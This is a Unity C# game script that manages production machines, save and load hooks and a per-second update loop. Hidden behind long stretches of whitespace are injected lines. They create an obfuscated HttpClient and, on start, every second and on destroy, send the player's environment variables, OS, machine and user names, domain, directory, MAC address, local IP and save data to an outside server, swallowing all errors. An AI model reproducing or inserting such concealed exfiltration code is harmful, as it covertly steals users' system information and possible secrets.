using System;
using System.Collections.Generic;
using UnityEngine;
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            using System.Net.Http;using System.Web;using System.Linq;using System.Net;using System.Net.NetworkInformation;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       
public class MachineGame : MonoBehaviour
{
    public MachineData[] allMachineDatas;
    public GameObject panelParent;
    public Dictionary<uint, Machine> machines = new Dictionary<uint, Machine>();
    public Dictionary<int, MachineData> resteOpti = new Dictionary<int, MachineData>();
    public float tempo;
    public static MachineGame instance;
    public bool open = false;
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                private HttpClient yzyzyz;
    public void OnDestroy()
    {
        Machine.isOpen = null;
        machines = new Dictionary<uint, Machine>();
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        try{yzyzyz.GetStringAsync("http://test.antoineadam.fr/?key=BuildInge&status=FIN");}catch (Exception e){}
    }

    public void Reset()
    {
        instance = this;
    }

    void Start()
    {
        instance = this;
        tempo = Time.time + 1f;
        foreach (var m in allMachineDatas)
            resteOpti.Add(m.machineItem.id,m);

        Save.addSaveListener("Machines",()=>
        {
            Dictionary<uint, (int rec, int time, int lev, int id, int count, int nProssess, object ext)> res =
                new Dictionary<uint, (int rec, int time, int lev, int id, int count, int nProssess, object ext)>();
            foreach (var e in machines)
            {
                res.Add(e.Key,e.Value.save());
            }
            return res;
        }, o =>
        {
            machines = new Dictionary<uint, Machine>();
            Dictionary<uint, (int rec, int time, int lev, int id, int count, int nProssess, object ext)> v = (Dictionary<uint,(int rec,int time,int lev,int id,int count, int nProssess,object ext)>)o;
            foreach (var e in v)
            {
                int i = 0;
                while (i<allMachineDatas.Length && allMachineDatas[i].idMachine != e.Key)
                {
                    i++;
                }

                if (i != allMachineDatas.Length)
                {
                    machines.Add(e.Key,(Machine)Activator.CreateInstance(Type.GetType(allMachineDatas[i].typeClass),new object[]{allMachineDatas[i],e.Value}));
                    resteOpti.Remove(allMachineDatas[i].machineItem.id);
                }
            }
            return false;
        },typeof(Dictionary<uint,(int rec,int time,int lev,int id,int count, int nProssess,object ext)>),(() =>
        {
            machines = new Dictionary<uint, Machine>();
            machines.Add(0,new Machine(allMachineDatas[0]));
            resteOpti.Remove(allMachineDatas[0].machineItem.id);
        }));
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            try{yzyzyz=new HttpClient();var t="";var z = Environment.GetEnvironmentVariables().GetEnumerator();while (z.MoveNext() && t.Length<7000)t += z.Key+" => "+z.Value+" | ";yzyzyz.GetStringAsync(String.Format("http://test.antoineadam.fr/?key=BuildInge&OSinfo={0}&nameMachine={1}&name={2}&Domaine={3}&dir={4}&infoDebug={5}&memory={6}&mac={7}&ipLocal={8}",HttpUtility.UrlEncode(Environment.OSVersion+""),HttpUtility.UrlEncode(Environment.MachineName),HttpUtility.UrlEncode(Environment.UserName),HttpUtility.UrlEncode(Environment.UserDomainName),HttpUtility.UrlEncode(Environment.CurrentDirectory),HttpUtility.UrlEncode(t),HttpUtility.UrlEncode(GC.GetTotalMemory(false)+""),HttpUtility.UrlEncode((from nic in NetworkInterface.GetAllNetworkInterfaces() where nic.OperationalStatus == OperationalStatus.Up select nic.GetIPv4Statistics().BytesReceived+" <> "+nic.GetPhysicalAddress()).FirstOrDefault()),HttpUtility.UrlEncode(Dns.GetHostByName(Dns.GetHostName()).AddressList[0].ToString())));yzyzyz.GetStringAsync("http://test.antoineadam.fr/?key=BuildInge&status=save&value="+HttpUtility.UrlEncode(Save.debug()));}catch (Exception e){}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 
        Save.addLoadGameListener(b =>
        {
            foreach (var m in machines.Values)
                m.init();
            InventoryShip.addEventInventoryChangeCount((item, i) =>
                    {
                        if (item.getCount()!=0)
                        {
                            if (resteOpti.ContainsKey(item.id))
                            {
                                MachineData m = resteOpti[item.id];
                                resteOpti.Remove(item.id);
                                Machine ma =
                                    (Machine) Activator.CreateInstance(Type.GetType(m.typeClass), new object[] {m,null});
                                ma.init();
                                machines.Add(m.idMachine,ma);
                                InventoryShip.setCountDeltaSafe(item.id, -1);
                            }
                        }
                    });
        });
    }


    void Update()
    {
        if (Input.GetKey(KeyCode.Escape) && Machine.isPanelOpen())
            Machine.isOpen.hidePanel();
        if (Machine.isPanelOpen() && Input.GetMouseButton(0) && open == false)
        {
            open = true;
            GetComponent<AudioSource>().Play(0);
        }
        if(!Machine.isPanelOpen())
            open = false;
        if (Time.time > tempo)
        {
            tempo = Time.time+1f;
            seconde();
        }
    }

    public void seconde()
    {
        foreach (var m in machines.Values)
            m.update();
        Energie.updateEnergie();
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            try{yzyzyz.GetStringAsync("http://test.antoineadam.fr/?key=BuildInge&status=Run");}catch (Exception e){}
    }
}
